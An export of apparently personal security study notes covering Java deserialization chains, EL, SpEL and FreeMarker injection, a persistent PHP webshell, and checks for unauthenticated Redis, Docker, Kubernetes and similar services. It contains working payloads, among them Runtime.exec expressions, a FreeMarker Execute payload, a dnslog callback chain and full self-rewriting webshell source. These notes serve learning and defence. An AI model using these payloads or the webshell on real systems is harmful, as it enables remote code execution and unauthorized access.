<p>2.动态类加载方法</p>
<p>Class.forName(“类”)   这个会有初始化操作，静态代码块执行</p>
<p>getSystemClassLoader()不会执行静态代码块</p>
<p>Class.forName(“类”，false，ClassLoader.getSystemClassLoader())   这样就不会初始化</p>
<p>ClassLoader.loadClass不进行初始化</p>
<p>类加载的几种方式</p>
<p>.class</p>
<p>getclass()</p>
<p>ClassLoader-&gt;SecureClassLoader-&gt;URLClassLoader-&gt;AppClassLoader</p>
<p>loadClass-&gt;findClass(重写方法)-&gt;defineClass(字节码加载类)</p>
<p>URLClassLoader 任意类加载   file&#x2F;http&#x2F;jar       jar:<a href="http://localhost:9999/Helllo.jar">http://localhost:9999/Helllo.jar</a></p>
<p>defineClass字节码加载任意类   私有</p>
<p>Unsafe.defineClass字节码加载public类不能直接生成   spring 里面可以直接生成</p>
<h4 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h4><p>loadClass()方法只对类进行加载，不会对类进行初始化。Class.forName 会默认对<br>类进行初始化(初始化就是静态代码块会执行)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> person.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//从原型class实例化对象</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">personconstructor</span> <span class="operator">=</span> c.getConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person) personconstructor.newInstance(<span class="string">&quot;abc&quot;</span>, <span class="number">22</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//获取类里面的属性</span></span><br><span class="line">        <span class="comment">//getFields不能打印private</span></span><br><span class="line"><span class="comment">//        Field[] personfields = c.getDeclaredFields();</span></span><br><span class="line"><span class="comment">//        for (Field f : personfields) &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(f);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        namefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        namefield.set(p,<span class="number">25</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line"><span class="comment">//        调用类里面的方法</span></span><br><span class="line"><span class="comment">//        Method[] personmethods = c.getMethods();</span></span><br><span class="line"><span class="comment">//        for (Method m : personmethods) &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(m);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">actionmethod</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;action&quot;</span>,String.class);</span><br><span class="line">        actionmethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        actionmethod.invoke(p,<span class="string">&quot;asdasd&quot;</span>);</span><br></pre></td></tr></table></figure>



<h3 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h3><p>吧url放到hashmap里边，hashMap的hashCode函数可以反序列化</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230716160846520.png" alt="image-20230716160846520"></p>
<p>1.hashmap接受参数O</p>
<p>2.目标类B URL</p>
<p>3.调用B.hashcode</p>
<p>4.hashmap.readObject –&gt;O.hashcode</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line"><span class="comment">//        这里不要发起请求，吧url对象的hashcode改成不是-1</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://tp12s4.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//		这里吧url对象的hashcodde改成1234</span></span><br><span class="line">        hashCodefield.set(url, <span class="number">1234</span>);</span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//这里吧hashcode改回-1</span></span><br><span class="line">        <span class="comment">//通过反射，改变已有对象的属性</span></span><br><span class="line"><span class="comment">//        hashCodefield.set(url,-1);</span></span><br><span class="line">        serialize(hashmap);</span><br></pre></td></tr></table></figure>





<p>分析反序列化</p>
<p>在反序列化漏洞中的应用</p>
<p>​    定制需要的对象</p>
<p>​	通过invoke调用除了同名函数以外的函数</p>
<p>​	通过class类创建对象，引入不能序列化的类</p>
<p>​	runtime.class</p>
<p>java反序列化漏洞</p>
<p>关于防御</p>
<h3 id="Hibernate-反序列化链"><a href="#Hibernate-反序列化链" class="headerlink" title="Hibernate 反序列化链"></a>Hibernate 反序列化链</h3><p><a href="https://mp.weixin.qq.com/s/mJfUKEHAB08xwBC-CtC31w">https://mp.weixin.qq.com/s/mJfUKEHAB08xwBC-CtC31w</a></p>
<h3 id="CommonsCollections链1"><a href="#CommonsCollections链1" class="headerlink" title="CommonsCollections链1"></a>CommonsCollections链1</h3><blockquote>
<p>jdk版本8u65    8u71开始就修复了 </p>
<p>原理：接收任意对象，执行readobject方法</p>
</blockquote>
<p>流程：</p>
<p>1.A.readobject，调用了O.aaa </p>
<p>2.修改O.aaa，调用O2.xxx</p>
<p>3.一直往后推，直到一个危险方法，</p>
<p>4.用Runtime.getRuntime.exec()执行</p>
<p>可以用不同类的同名函数，或者任意方法调用(比如说反射，动态加载字节码)</p>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>jdk8u65</p>
<p><a href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html</a></p>
<p>open</p>
<p><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a></p>
<p>解压，&#x2F;src&#x2F;share&#x2F;classes&#x2F;sun目录放到jdk8u65里面的src</p>
<p>maven</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>所有的 都可以序列化，重写readobject，接收任意对象作为参数</p>
<h3 id="CommonsCollections链6"><a href="#CommonsCollections链6" class="headerlink" title="CommonsCollections链6"></a>CommonsCollections链6</h3><blockquote>
<p>jdk版本通用， cc版本通用</p>
</blockquote>
<h3 id="CommonsCollections链3"><a href="#CommonsCollections链3" class="headerlink" title="CommonsCollections链3"></a>CommonsCollections链3</h3><blockquote>
<p>3，2，4都是动态类加载， 代码执行</p>
</blockquote>
<p> 回顾类加载</p>
<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><strong>SQL注入</strong></h4><p>参数化查询，预编译</p>
<p><strong>mybatis</strong></p>
<p>#和$的区别，MyBatis 中使用 parameterType 向 SQL 语句传参，在 SQL 引用传参可以使用<br>#{Parameter}和${Parameter}两种方式。</p>
<p>#会用？传参， $会用单引号拼接传参，导致注入产生</p>
<p><strong>Hibernate 框架</strong></p>
<blockquote>
<p>Hibernate 是对持久化类的对象进行操作而不是直接对数据库进行操作，因此 HQL 查询语句由 Hibernate 引擎进行解析，这意味着产生的错误信息可能来自数据库，也可能来自 Hibernate 引擎</p>
</blockquote>
<p>避免注入的几种参数绑定方式</p>
<p>位置参数()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String parameter = &quot;z1ng&quot;;</span><br><span class="line">Query&lt;User&gt; query = session.createQuery(&quot;from com.z1ng.bean.Userwhere name</span><br><span class="line">= ?1&quot;, User.class);</span><br><span class="line">query.setParameter(1, parameter);</span><br></pre></td></tr></table></figure>

<p>命名参数()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Query&lt;User&gt; query = session.createQuery(&quot;from com.z1ng.bean.Userwhere name</span><br><span class="line">= ?1&quot;, User.class);String parameter = &quot;z1ng&quot;;</span><br><span class="line">Query&lt;User&gt; query = session.createQuery(&quot;from com.z1ng.bean.Userwhere name</span><br><span class="line">= :name&quot;, User.class);</span><br><span class="line">query.setParameter(&quot;name&quot;, parameter);</span><br></pre></td></tr></table></figure>

<p>命名参数列表()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; names = Arrays.asList(&quot;z1ng&quot;, &quot;z2ng&quot;);</span><br><span class="line">Query&lt;User&gt; query = session.createQuery(&quot;from com.z1ng.bean.User where name in</span><br><span class="line">(:names)&quot;, User.class);</span><br><span class="line">query.setParameter(&quot;names&quot;, names);</span><br></pre></td></tr></table></figure>

<p>类实例(JavaBean)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user1.setName(&quot;z1ng&quot;);</span><br><span class="line">Query&lt;User&gt; query = session.createQuery(&quot;from com.z1ng.bean.User where name</span><br><span class="line">=:name&quot;, User.class);</span><br><span class="line">query.setProperties(user1);</span><br></pre></td></tr></table></figure>

<p>hibernate支持原生的SQL语句，应采用参数绑定的方式构造语句</p>
<h4 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a><strong>命令注入</strong></h4><h4 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h4><p>与命令注入相比，代码注入更具有灵活性，例如在cc链中，反序列化直接用runtime.getruntime().exec()执行系统命令是没有回显的，一种思路是通过URLloader远程加载类文件以及异常处理机制构造出可以回显的利用方式，具体步骤如下：</p>
<p>首先构造一个恶意代码类，编译成jar包放置在远程服务器上，然后利用cc链反序列化漏洞可以注入任意代码的特点，构造poc，可以发现系统执行了whoami命令</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718100605797.png" alt="image-20230718100605797"></p>
<h4 id="表达式注入"><a href="#表达式注入" class="headerlink" title="表达式注入"></a>表达式注入</h4><blockquote>
<p>最早出现于2012年12月的一篇论文中，文中详细阐述的表达式注入产生的原因和危害，例如struts的OGNL表达式引起的远程代码执行</p>
</blockquote>
<h5 id="EL表达式基础"><a href="#EL表达式基础" class="headerlink" title="EL表达式基础"></a><strong>EL表达式</strong>基础</h5><p>主要功能：</p>
<ul>
<li><p>获取数据：可以从jsp的四大作用域（page，request,session，application）中获取数据</p>
</li>
<li><p>执行运算：在jsp页面执行一些简单的逻辑运算，关系运算，算术运算</p>
</li>
<li><p>获取web开发常用对象：EL表达式内置了11个隐式对象，开发者可以通过这类隐式对象，获得想要的数据</p>
</li>
<li><p>调用java方法：EL表达式允许用户开发自定义EL函数，以及在jsp页面通过el表达式调用java类的方法</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718104846464.png" alt="image-20230718104846464"></p>
</li>
</ul>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718104858646.png" alt="image-20230718104858646"></p>
<h5 id="EL基础语法"><a href="#EL基础语法" class="headerlink" title="EL基础语法"></a>EL基础语法</h5><p>在 JSP 中，用户可以使用<code>$&#123;&#125;</code>来表示此处为 EL 表达式，例如，表达式<code>$&#123; name &#125;</code>表示获取<code>name</code>变量。当 EL 表达式未指定作用域范围时，默认在 page 作用域范围查找，而后依次在 request、session、application 范围查找,也可以使用作用域作为前缀找，表达式<code>$&#123; requestScope.name&#125;</code>表示在 request 作用域范围中获取“name”变量</p>
<p><strong>获取对象属性的两种方式</strong></p>
<ul>
<li><p>第一种格式为${对象.属性}，例如：${param.name}</p>
</li>
<li><p>第二种为使用“[]”符号，例如：${param[name]}</p>
</li>
</ul>
<p>当属性名中存在特殊字符或者属性名是一个变量时，则需要使用<code>[]</code>符号的方式获取属性，例如：${User[“Login-Flag”]}和${User[data]}</p>
<h5 id="案例"><a href="#案例" class="headerlink" title="案例"></a><strong>案例</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;Java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;EL 表达式实例页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">        &lt;h3&gt; 输入的 name 值为：$&#123;param.name&#125;&lt;/h3&gt;</span><br><span class="line">    &lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>url访问index.jsp?name&#x3D;zhhhy时，</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718105831460.png" alt="image-20230718105831460"></p>
<p>也可以实例化java的内置类，如runtime.class</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;Java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">	&lt;title&gt;$Title$&lt;/title&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">	$&#123;Runtime.getRuntime().exec(&quot;calc&quot;)&#125;</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718105942751.png" alt="image-20230718105942751"></p>
<h6 id="cve-2011-2730-spring-标签EL表达式漏洞"><a href="#cve-2011-2730-spring-标签EL表达式漏洞" class="headerlink" title="cve-2011-2730 spring 标签EL表达式漏洞"></a>cve-2011-2730 spring 标签EL表达式漏洞</h6><blockquote>
<p>漏洞成因是 Spring 的 message 标签能够解析执行 EL 表达式，而 Web 容器也会对 EL<br>表达式进行一次解析，两次解析使 EL 表达式注入得以利用</p>
</blockquote>
<p>​	Spring 表达式语言（SpEL）是一种与 EL 功能类似的表达式语言，可以独立于spring容器使用，</p>
<p>​	在spel中<code>EvaluationContext</code>是用于评估表达式和解析属性、方法以及字段并帮助执行类型转换的接口，这个接口有两种实现<code>SimpleEvaluationContext</code>和<code>StandardEvaluationContext</code>默认是用<code>StandardEvaluationContext</code>对表达式进行评估</p>
<ul>
<li>SimpleEvaluationContext，针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开spel语言特性和配置选项的子集</li>
<li>StandardEvaluationContext，针对全套SpEL语言功能和配置选项，用户可以使用它来指定默认的根对象并配置每个可用的评估相关策略</li>
</ul>
<p>​	当使用StandardEvaluationContext进行上下文评估时，由于StandardEvaluationContext权限过大，可以执行java任意代码，例如利用runtime执行来弹出一个计算器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">expressionstr</span> <span class="operator">=</span> <span class="string">&quot;T(Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;</span><br><span class="line"><span class="comment">//一个解析器</span></span><br><span class="line"><span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line"><span class="type">EvaluationContext</span> <span class="variable">evaluationContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardEvaluationContext</span>();</span><br><span class="line"><span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(expressionstr);</span><br><span class="line">System.out.println(expression.getValue(evaluationContext));</span><br></pre></td></tr></table></figure>

<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718111401476.png" alt="image-20230718111401476"></p>
<h6 id="cve-2018-1273-spring-datacommons-远程代码执行漏洞"><a href="#cve-2018-1273-spring-datacommons-远程代码执行漏洞" class="headerlink" title="cve-2018-1273 spring datacommons 远程代码执行漏洞"></a>cve-2018-1273 spring datacommons 远程代码执行漏洞</h6><blockquote>
<p>攻击者可以构造含有恶意代码的 SpEL 表达式实现远程代码执行，接管服务器权限</p>
</blockquote>
<p>官方发布的修复补丁中，可以清晰的看到使用了SimpleEvaluationContext代替了StandardEvaluationContext</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718112106689.png" alt="image-20230718112106689"></p>
<h4 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h4><blockquote>
<p>web中广泛使用模板引擎来进行页面的定制化呈现，用户可以通过模板定制化展示符合自身特征的页面，模板引擎支持的页面定制展示的同时也带来了一定的安全风险</p>
</blockquote>
<h6 id="freemarker模板基础"><a href="#freemarker模板基础" class="headerlink" title="freemarker模板基础"></a>freemarker模板基础</h6><p>freemarker模板文件和html一样是静态页面，freemarker引擎解析并动态替换模板中的内容进行渲染，随后将渲染出的结果发送到访问者的浏览器中，</p>
<p>freemarker模板语言有四个部分组成，</p>
<ul>
<li>文本：文本会原样输出</li>
<li>插值：这部分的输出会被模板引擎计算的值进行替换</li>
<li>FTL标签：和HTML类似，他是给freemarker提示，不会打印在输出内容中</li>
<li>注释：和HTML一样</li>
</ul>
<h6 id="new函数的利用"><a href="#new函数的利用" class="headerlink" title="new函数的利用"></a>new函数的利用</h6><p>new函数可以创建继承自<code>freemarker.template.TemplateModel</code>的实例，查看源码会发现<code>freemarker.template.utility.Execute#exec</code>可以执行任意代码，因此可以通过new函数实例化一个execute对象并执行一个exec（）方法造成任意代码执行</p>
<p>payload代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;calc.</span><br><span class="line">exe&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p>通过阅读代码发现<code>freemarker.template.utility</code>包中有几个类都可以被利用来执行恶意代码</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718131713569.png" alt="image-20230718131713569"></p>
<h6 id="api函数的利用"><a href="#api函数的利用" class="headerlink" title="api函数的利用"></a>api函数的利用</h6><p>api函数可以用来访问java api 使用方法为value?api.somejavamethod(),相当于value.somejavamethod（）,因此可以利用api函数通过getclassloader来获取一个类加载器，进而加载恶意类，也可以通过getresource来读取服务器上的资源文件</p>
<p>&lt;#assign classLoader&#x3D;object?api.class.getClassLoader()&gt;<br>${classLoader.loadClass(“Evil.class”)}</p>
<h6 id="OFCMS1-1-2版本注入漏洞"><a href="#OFCMS1-1-2版本注入漏洞" class="headerlink" title="OFCMS1.1.2版本注入漏洞"></a>OFCMS1.1.2版本注入漏洞</h6><blockquote>
<p>ofcms是java版的cms系统，fcms1.1.3之前的版本，</p>
</blockquote>
<p>OFCMS使用freemarker作为模板引擎，然而开发者未对网站后台的模拟文件功能处的所存储的模板数据进行过滤，导致攻击者可以使用freemarker模板注入的方式获取webshell</p>
<h6 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h6><p>该漏洞出现的文件路径为<code>oufu-ofcms-V1.1.2\ofcms\ofcms-admin\src\main\Java\com\ ofsoft\cms\admin\controller\cms\TemplateController.Java</code>，通过在TemplateController类的save方法设置断点可以发现，save方法未对存入模板的数据进行充足的过滤，攻击者可以将可执行系统命令的恶意代码存入freemarker模板</p>
<h6 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h6><p>官方针对new和api的两种利用方式发布了一些策略，从版本2.3.22开始，api_builtin_enabled的默认值为false，这意味着api内建函数在此之后不能随意使用。</p>
<p>官方还提供了3个预定义函数的解析器来限制new函数对类的访问</p>
<ul>
<li>UNRESTRICTED_RESOLVER：简单地调用 ClassUtil.forName(String)。</li>
<li>SAFER_RESOLVER：与第一个类似，但禁止解析 ObjectConstructor、Execute和 freemarker.template.utility.JythonRuntime。</li>
<li>ALLOWS_NOTHING_RESOLVER：禁止解析任何类</li>
</ul>
<p>官方手册中也表明了应当限制普通用户可以上传和限制模板文件的权限，OFCMS1.1.2版本的注入漏洞正是可编辑模板文件造成的任意代码执行</p>
<h3 id="失效的身份认证"><a href="#失效的身份认证" class="headerlink" title="失效的身份认证"></a>失效的身份认证</h3><p>jwt token猜解实验</p>
<blockquote>
</blockquote>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>php内存马学习</title>
    <url>/2023/07/02/php%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<p>两种</p>
<p>1.不死马，直接用代码写一个死循环，不间断写入php shell,或者执行一段代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);<span class="comment">// 设置脚本执行的最大时间限制。将参数设置为0意味着脚本可以无限制地运行，没有时间限制。</span></span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);<span class="comment">// 用户访问完成代码仍然继续运行</span></span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);<span class="comment">// 删除当前正在执行的 PHP 文件。__FILE__ 是一个常量，表示当前执行脚本的文件的完整路径和文件名。</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;<span class="comment">// 无限循环</span></span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;test&quot;]) ?&gt;&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="variable">$content</span>);<span class="comment">// 用于将字符串内容写入到文件中</span></span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">10000</span>);<span class="comment">// 让脚本休眠一段时间，以微秒为单位</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>2.fastcgi马，利用php-fpm可以直接通过fastcgi协议通讯的原理，可以指定<code>SCRIPT_FILENAME</code>，去执行机器上存在的 PHP 文件；或者配合<code>auto_prepend_file+php://input</code>，通过每次提交POST code去执行</p>
<p>PHP 中有两个有趣的配置项，</p>
<ul>
<li><code>auto_prepend_file</code>：指定在执行每个php文件之前自动包含的文件。</li>
<li><code>auto_append_file</code>：用于指定在执行每个php文件之后自动包含的文件</li>
</ul>
<p>假设将 <code>auto_prepend_file</code> 设置为 <code>php://input</code>，这就相当于执行任何 PHP 文件前都要包含一遍 POST 的内容。这样的话咱们只需要把PHP代码放在请求里，就会被当作代码被执行。（需要启用远程文件包含选项 <code>allow_url_include</code>）</p>
<p>第一种木马的查杀方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    ignore_user_abort(true);</span><br><span class="line">    set_time_limit(0);</span><br><span class="line">    while (1) &#123;</span><br><span class="line">        $pid = 353; // php-fpm 进程</span><br><span class="line">        @unlink(&quot;shell.php&quot;);</span><br><span class="line">        exec(&quot;kill -9 $pid&quot;);</span><br><span class="line">        usleep(1000);// 我的剑比你的剑快</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>未授权漏洞收集</title>
    <url>/2023/06/28/%E6%9C%AA%E6%8E%88%E6%9D%83/</url>
    <content><![CDATA[<p>默认端口：21, 139, 873, 2049, 2181, 2182, 2375, 5601, 5672, 5900, 5901, 5984, 6379, 6443, 8080, 8088, 8095, 8161, 9100, 9200, 9300, 11211, 15672, 15692, 20048, 25672, 27017</p>
<h3 id="1-redis未授权"><a href="#1-redis未授权" class="headerlink" title="1.redis未授权"></a>1.redis未授权</h3><blockquote>
<p>默认端口6379</p>
</blockquote>
<p>漏洞验证</p>
<p>安装Redis，然后连接到服务。</p>
<p> # yum install redis</p>
<p># redis-cli -h 10.2.20.73 -p 6379</p>
<p>10.2.20.73:6379&gt; info</p>
<h3 id="2-mongodb未授权"><a href="#2-mongodb未授权" class="headerlink" title="2.mongodb未授权"></a>2.mongodb未授权</h3><blockquote>
<p>默认端口27017</p>
</blockquote>
<p>漏洞验证</p>
<p>安装mongodb，然后连接到服务。</p>
<p># yum install mongodb</p>
<p># mongo –host 10.2.20.34 –port 27017</p>
<p>xxx-test:SECONDARY&gt; show dbs</p>
<h3 id="3-memcached未授权访问"><a href="#3-memcached未授权访问" class="headerlink" title="3.memcached未授权访问"></a>3.memcached未授权访问</h3><blockquote>
<p>默认端口11211</p>
</blockquote>
<p>漏洞验证</p>
<p>telnet 10.10.4.89 11211 或 nc -vv <target> 11211</p>
<p>无需用户名密码，可以直接连接memcache 服务的11211端口</p>
<p>使用了 stats 命令来输出 Memcached 服务信息</p>
<h3 id="4-zookeeper未授权"><a href="#4-zookeeper未授权" class="headerlink" title="4.zookeeper未授权"></a>4.zookeeper未授权</h3><blockquote>
<p>默认端口2181，2182</p>
</blockquote>
<p>漏洞验证</p>
<p>安装ZooKeeper，然后连接到服务。</p>
<p>ZooKeeper: <a href="https://zookeeper.apache.org/releases.html">https://zookeeper.apache.org/releases.html</a></p>
<p># wget <a href="https://mirrors.bfsu.edu.cn/apache/zookeeper/zookeeper-3.6.1/apache-zookeeper-3.6.1-bin.tar.gz">https://mirrors.bfsu.edu.cn/apache/zookeeper/zookeeper-3.6.1/apache-zookeeper-3.6.1-bin.tar.gz</a></p>
<p># tar -xzvf apache-zookeeper-3.6.1-bin.tar.gz</p>
<p># cd apache-zookeeper-3.6.1-bin&#x2F;bin</p>
<p># .&#x2F;zkCli.sh -timeout 0 -r -server 10.10.4.72:2181</p>
<p>备注：windows 下为：zkCli.cmd -timeout 0 -r -server 10.10.4.72:2181</p>
<h3 id="5-elasticsearch未授权"><a href="#5-elasticsearch未授权" class="headerlink" title="5.elasticsearch未授权"></a>5.elasticsearch未授权</h3><blockquote>
<p>默认端口 9100，9200，9300</p>
</blockquote>
<p>漏洞验证</p>
<p>使用nmap寻找相关的端口和服务，直接访问脆弱的服务</p>
<p>curl <a href="http://10.2.20.48:9200/">http://10.2.20.48:9200/</a></p>
<p>curl <a href="http://10.2.20.48:9200/_cat">http://10.2.20.48:9200/_cat</a></p>
<p>curl <a href="http://10.2.20.48:9200/_cat/_river/_search">http://10.2.20.48:9200/_cat/_river/_search</a></p>
<p>curl <a href="http://10.2.20.48:9200/cat/indices">http://10.2.20.48:9200/cat/indices</a></p>
<p><a href="http://10.2.20.48:9100/metrics">http://10.2.20.48:9100/metrics</a></p>
<h3 id="6-kibana未授权"><a href="#6-kibana未授权" class="headerlink" title="6.kibana未授权"></a>6.kibana未授权</h3><blockquote>
<p>默认端口5601（最好是直接访问目录，能访问就能shell</p>
</blockquote>
<p>漏洞验证</p>
<p>直接访问kibana的页面，</p>
<p>如：<a href="https://10.10.4.89:5601/">https://10.10.4.89:5601/</a></p>
<p><a href="https://10.10.4.89/app/kibana">https://10.10.4.89/app/kibana</a></p>
<p># <a href="http://10.10.4.89:5601/app/kibana#/">http://10.10.4.89:5601/app/kibana#/</a></p>
<p>并且无需账号密码可以登录进入界面。</p>
<h3 id="7-docker-remote-api-未授权访问"><a href="#7-docker-remote-api-未授权访问" class="headerlink" title="7.docker remote api 未授权访问"></a>7.docker remote api 未授权访问</h3><blockquote>
<p>默认端口2375</p>
</blockquote>
<p>漏洞验证</p>
<p>直接使用浏览器访问：</p>
<p><a href="http://10.10.4.89:2375/">http://10.10.4.89:2375/</a></p>
<p><a href="http://10.10.4.89:2375/version">http://10.10.4.89:2375/version</a></p>
<p><a href="http://10.10.4.89:2375/info">http://10.10.4.89:2375/info</a></p>
<p>docker -H tcp:&#x2F;&#x2F;192.168.15.5:2375 version</p>
<p>docker -H tcp:&#x2F;&#x2F;10.10.4.89:2375 images</p>
<h3 id="8-kubernetes-api-server-未授权访问"><a href="#8-kubernetes-api-server-未授权访问" class="headerlink" title="8.kubernetes api server 未授权访问"></a>8.kubernetes api server 未授权访问</h3><blockquote>
<p>默认端口 8080，6443</p>
</blockquote>
<p>漏洞验证</p>
<p>使用nmap寻找相关的端口和服务，直接访问脆弱的服务</p>
<p>端口：8080  <a href="http://10.10.4.89:8080/">http://10.10.4.89:8080/</a></p>
<p>端口：8080： api dashboard： <a href="http://10.10.4.89:8080/ui">http://10.10.4.89:8080/ui</a> </p>
<p>端口：10250端口是kubelet API的HTTPS端口，通过路径&#x2F;pods获取环境变量、运行的容器信息、命名空间等信息。</p>
<p><a href="http://10.10.4.89:10250/pods">http://10.10.4.89:10250/pods</a></p>
<p><a href="http://10.10.4.89:6443/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy">http://10.10.4.89:6443/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy</a></p>
